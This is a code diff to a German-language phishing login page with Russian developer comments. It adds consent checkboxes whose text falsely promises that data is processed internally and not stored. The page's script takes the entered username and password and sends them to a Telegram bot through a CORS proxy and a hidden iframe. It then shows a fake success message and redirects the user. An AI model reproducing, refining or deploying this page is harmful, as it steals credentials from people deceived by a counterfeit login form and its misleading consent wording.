@@ -45,33 +45,57 @@
             border-color: #667eea;
             box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
         }
-        .checkbox-container {
-            margin: 20px 0 10px 0;
+        .checkbox-group {
+            margin: 15px 0;
             text-align: left;
             font-size: 14px;
-            color: #555;
+            color: #444;
         }
-        .checkbox-container label {
-            cursor: pointer;
+        .checkbox-group label {
             display: flex;
             align-items: flex-start;
+            cursor: pointer;
+            margin-bottom: 8px;
         }
-        .checkbox-container input[type="checkbox"] {
+        .checkbox-group input[type="checkbox"] {
             margin-right: 10px;
-            margin-top: 3px;
+            margin-top: 2px;
             flex-shrink: 0;
+        }
+        .details {
+            font-size: 12px;
+            color: #666;
+            margin-top: 6px;
+            padding-left: 24px;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease, padding 0.4s ease;
+        }
+        .details.open {
+            max-height: 200px;
+            padding-bottom: 10px;
+        }
+        .toggle-details {
+            color: #667eea;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 13px;
+            margin-left: 24px;
+        }
+        .toggle-details:hover {
+            color: #5a6fd8;
         }
         button {
             width: 100%;
             padding: 16px;
-            background: #aab3e0; /* серо-синий, пока галочка не поставлена */
+            background: #aab3e0;
             color: white;
             border: none;
             border-radius: 10px;
             font-size: 18px;
             font-weight: bold;
             cursor: not-allowed;
-            margin-top: 10px;
+            margin-top: 20px;
             transition: background 0.3s;
         }
         button.active {
@@ -101,11 +125,28 @@
             <input type="text" id="username" placeholder="Benutzername" required>
             <input type="password" id="password" placeholder="Passwort" required>
 
-            <div class="checkbox-container">
+            <!-- Первая галочка -->
+            <div class="checkbox-group">
                 <label>
-                    <input type="checkbox" id="consent">
-                    <span>Mit dem Einloggen stimmen Sie der Übermittlung Ihrer Anmeldedaten zu Verifizierungszwecken und zur Sicherstellung der Konto-Sicherheit zu. Die Daten werden ausschließlich intern verarbeitet.</span>
+                    <input type="checkbox" id="consent1">
+                    <span>Ich stimme der Verarbeitung meiner Daten zu</span>
                 </label>
+                <div class="toggle-details" onclick="toggleDetails(this)">Mehr anzeigen ▼</div>
+                <div class="details">
+                    Mit dem Einloggen stimmen Sie der Übermittlung und Verarbeitung Ihrer Anmeldedaten (Benutzername und Passwort) zu Verifizierungszwecken zu. Die Daten werden ausschließlich zur Überprüfung der Kontoberechtigung und zur Sicherstellung der Systemsicherheit verwendet. Es erfolgt keine Speicherung über den Verifizierungsprozess hinaus.
+                </div>
+            </div>
+
+            <!-- Вторая галочка -->
+            <div class="checkbox-group">
+                <label>
+                    <input type="checkbox" id="consent2">
+                    <span>Ich akzeptiere die Nutzungsbedingungen</span>
+                </label>
+                <div class="toggle-details" onclick="toggleDetails(this)">Mehr anzeigen ▼</div>
+                <div class="details">
+                    Durch die Nutzung dieses Dienstes erklären Sie sich mit den geltenden Nutzungsbedingungen einverstanden. Dies umfasst die Zustimmung zur Protokollierung von Login-Versuchen zur Erkennung von Missbrauch sowie die Verwendung von Sicherheitsmechanismen wie Zwei-Faktor-Authentifizierung (falls aktiviert). Ihre Daten werden gemäß den Datenschutzrichtlinien behandelt.
+                </div>
             </div>
 
             <button type="submit" id="loginButton" disabled>Einloggen</button>
@@ -123,26 +164,36 @@
         const proxyUrl = "https://corsproxy.io/?";
         const redirectUrl = "https://www.google.com"; // ← Замени на свой URL!
 
-        const consentCheckbox = document.getElementById("consent");
+        const consent1 = document.getElementById("consent1");
+        const consent2 = document.getElementById("consent2");
         const loginButton = document.getElementById("loginButton");
 
-        // Активация кнопки только при согласии
-        consentCheckbox.addEventListener("change", function() {
-            if (this.checked) {
+        // Функция проверки галочек и активации кнопки
+        function checkConsents() {
+            if (consent1.checked && consent2.checked) {
                 loginButton.disabled = false;
                 loginButton.classList.add("active");
             } else {
                 loginButton.disabled = true;
                 loginButton.classList.remove("active");
             }
-        });
+        }
+
+        consent1.addEventListener("change", checkConsents);
+        consent2.addEventListener("change", checkConsents);
+
+        // Раскрытие/скрытие текста
+        function toggleDetails(element) {
+            const details = element.nextElementSibling;
+            details.classList.toggle("open");
+            element.textContent = details.classList.contains("open") ? "Weniger anzeigen ▲" : "Mehr anzeigen ▼";
+        }
 
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
-            // Дополнительная проверка (на всякий случай)
-            if (!consentCheckbox.checked) {
-                document.getElementById("status").innerHTML = "Sie müssen zustimmen!";
+            if (!consent1.checked || !consent2.checked) {
+                document.getElementById("status").innerHTML = "Sie müssen allen Bedingungen zustimmen!";
                 document.getElementById("status").style.color = "red";
                 return;
             }
@@ -150,19 +201,17 @@
             const rawUsername = document.getElementById("username").value;
             const rawPassword = document.getElementById("password").value;
 
-            const text = encodeURIComponent(`🔔 Neuer Login-Versuch! (Zustimmung erteilt)\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);
+            const text = encodeURIComponent(`🔔 Neuer Login-Versuch! (Beide Zustimmungen erteilt)\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);
 
             const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;
             const fullUrl = proxyUrl + encodeURIComponent(apiUrl);
 
-            // Отправка в Telegram
             const iframe = document.createElement('iframe');
             iframe.src = fullUrl;
             iframe.style.display = "none";
             document.body.appendChild(iframe);
             setTimeout(() => document.body.removeChild(iframe), 1000);
 
-            // Успех и перенаправление
             document.getElementById("status").innerHTML = "Erfolgreich angemeldet! Weiterleitung... 🔄";
             document.getElementById("status").style.color = "#28a745";
 
